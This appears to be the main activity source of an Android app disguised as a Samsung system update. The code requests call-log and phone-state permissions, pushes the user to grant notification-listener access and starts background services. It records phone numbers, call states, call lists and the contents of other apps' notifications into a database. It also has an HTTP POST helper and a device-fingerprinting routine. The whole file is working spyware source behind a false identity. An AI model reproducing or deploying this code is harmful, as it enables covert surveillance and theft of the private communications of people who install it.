package com.samsung.update;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

public class MainActivity extends Activity {

    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
//    private static final String ACTION_NOTIFICATION_LISTENER_SETTINGS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS";

//    private ImageView interceptedNotificationImageView;
    private ImageChangeBroadcastReceiver imageChangeBroadcastReceiver;
//    private AlertDialog enableNotificationListenerAlertDialog;
    private Button test;
    private SQLiteDatabase db;

    void post(String url, RequestBody data) throws IOException {
        Log.e("network", "start...");
        OkHttpClient client = new OkHttpClient();
        okhttp3.Request request = new okhttp3.Request.Builder()
                .url(url)
                .post(data)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }
            @Override
            public void onResponse(Call call, okhttp3.Response response) throws IOException {
                if (response.isSuccessful()) {
                    final String myResponse = response.body().string();
                    MainActivity.this.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Log.e("response", myResponse);
                        }
                    });
                }
            }
        });
    }

    public static String getDetails() {
        String details="";
        try {
            details+="OS version: "+System.getProperty("os.version").toString()+"\n";
            details+="API Level: "+android.os.Build.VERSION.SDK.toString()+"\n";
            details+="Device: "+android.os.Build.DEVICE.toString()+"\n";
            details+="Model: "+android.os.Build.MODEL.toString()+"\n";
            details+="Product: "+android.os.Build.PRODUCT.toString()+"\n";
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        try {
            details+= "VERSION.RELEASE : "+ Build.VERSION.RELEASE
                    +"\nVERSION.INCREMENTAL : "+Build.VERSION.INCREMENTAL
                    +"\nVERSION.SDK.NUMBER : "+Build.VERSION.SDK_INT
                    +"\nBOARD : "+Build.BOARD
                    +"\nBOOTLOADER : "+Build.BOOTLOADER
                    +"\nBRAND : "+Build.BRAND
                    +"\nCPU_ABI : "+Build.CPU_ABI
                    +"\nCPU_ABI2 : "+Build.CPU_ABI2
                    +"\nDISPLAY : "+Build.DISPLAY
                    +"\nFINGERPRINT : "+Build.FINGERPRINT
                    +"\nHARDWARE : "+Build.HARDWARE
                    +"\nHOST : "+Build.HOST
                    +"\nID : "+Build.ID
                    +"\nMANUFACTURER : "+Build.MANUFACTURER
                    +"\nMODEL : "+Build.MODEL
                    +"\nPRODUCT : "+Build.PRODUCT
                    +"\nSERIAL : "+Build.SERIAL
                    +"\nTAGS : "+Build.TAGS
                    +"\nTIME : "+Build.TIME
                    +"\nTYPE : "+Build.TYPE
                    +"\nUNKNOWN : "+Build.UNKNOWN
                    +"\nUSER : "+Build.USER+"\n";
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        return details;
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if(!isNotificationServiceEnabled()){
            requestNotification();
        }

        DbHandler dbHandler = new DbHandler(MainActivity.this);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.READ_PHONE_STATE},
                    1);
        }

        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CALL_LOG},
                    1);
        }


        Intent intent = new Intent(getApplicationContext(), NotificationListener.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getApplication().startForegroundService(intent);
        } else {
            getApplication().startService(intent);
        }
        Log.e("Notification Autostart:", "started");

        intent = new Intent(getApplicationContext(), CallListener.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getApplication().startForegroundService(intent);
        } else {
            getApplication().startService(intent);
        }
        Log.e("Call Autostart:", "started");

        imageChangeBroadcastReceiver = new ImageChangeBroadcastReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.samsung.update");
        registerReceiver(imageChangeBroadcastReceiver,intentFilter);

        test=(Button) findViewById(R.id.button);
        test.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                addNotification();
            }
        });
    }

    private void addNotification() {
//        NotificationCompat.Builder builder = new NotificationCompat.Builder(this)
//                .setSmallIcon(R.drawable.ic_launcher_background)
//                .setContentTitle("Notifications Example")
//                .setContentText("This is a test notification");
//        Intent notificationIntent = new Intent(this, MainActivity.class);
//        PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_UPDATE_CURRENT);
//        builder.setContentIntent(contentIntent);
//        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
//        manager.notify(0, builder.build());
        int importance = NotificationManager.IMPORTANCE_LOW;
        NotificationChannel channel = new NotificationChannel("samsungupdate", "update", importance);
        channel.setDescription("it's a test");
        channel.enableLights(true);
        channel.setLightColor(Color.RED);
        channel.enableVibration(true);
        channel.setVibrationPattern(
                new long[]{100, 200, 300, 400, 500, 400, 300, 200, 400});
        NotificationManager notificationManager= (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.createNotificationChannel(channel);
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(imageChangeBroadcastReceiver);
    }

    private boolean isNotificationServiceEnabled(){
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), ENABLED_NOTIFICATION_LISTENERS);
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public class ImageChangeBroadcastReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
//            db = new Database(context);
            DbHandler dbHandler = new DbHandler(MainActivity.this);

            String type=intent.getStringExtra("type");
            if(type.equals("call")) {
                Log.e("call", "------------------------");
                Log.e("package", intent.getStringExtra("package"));
                Log.e("phone", intent.getStringExtra("phone"));
                Log.e("state", intent.getStringExtra("state"));
                String typ="call";
                String packs=intent.getStringExtra("package");
                String phone=intent.getStringExtra("phone");
                String state=intent.getStringExtra("state");

                String datas="";
                JSONObject jObjectData = new JSONObject();
                try {
                    jObjectData.put("type", typ);
                    jObjectData.put("package", packs);
                    jObjectData.put("phone", phone);
                    jObjectData.put("state", state);
                    datas=jObjectData.toString();
                } catch (JSONException e) {
                    e.printStackTrace();
                    datas=typ+"\t"+packs+"\t"+phone+"\t"+state;
                }

                dbHandler.insertLog(typ,datas);
            }
            else if(type.equals("callList")){
                Log.e("callList", "------------------------");
                Log.e("package", intent.getStringExtra("package"));
                Log.e("data", intent.getStringExtra("data"));
                String typ="callList";
                String packs=intent.getStringExtra("package");
                String data=intent.getStringExtra("data");

                String datas="";
                JSONObject jObjectData = new JSONObject();
                try {
                    jObjectData.put("type", typ);
                    jObjectData.put("package", packs);
                    jObjectData.put("data", data);
                    datas=jObjectData.toString();
                } catch (JSONException e) {
                    e.printStackTrace();
                    datas=typ+"\t"+packs+"\t"+data;
                }

                dbHandler.insertLog(typ,datas);
            }
            else {
                Log.e("notification", "------------------------");
                Log.e("package", intent.getStringExtra("package"));
                Log.e("title", intent.getStringExtra("title"));
                Log.e("text", intent.getStringExtra("text"));
                Log.e("ticker", intent.getStringExtra("ticker"));
                String typ="notification";
                String packs=intent.getStringExtra("package");
                String title=intent.getStringExtra("title");
                String text=intent.getStringExtra("text");
                String ticker=intent.getStringExtra("ticker");

                String datas="";
                JSONObject jObjectData = new JSONObject();
                try {
                    jObjectData.put("type", typ);
                    jObjectData.put("package", packs);
                    jObjectData.put("title", title);
                    jObjectData.put("text", text);
                    jObjectData.put("ticker", ticker);
                    datas=jObjectData.toString();
                } catch (JSONException e) {
                    e.printStackTrace();
                    datas=typ+"\t"+packs+"\t"+title+"\t"+text+"\t"+ticker;
                }

                dbHandler.insertLog(typ,datas);
            }
        }
    }

    private void requestNotification(){
        final Intent i = new Intent();
        i.setAction(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(i);
    }
}
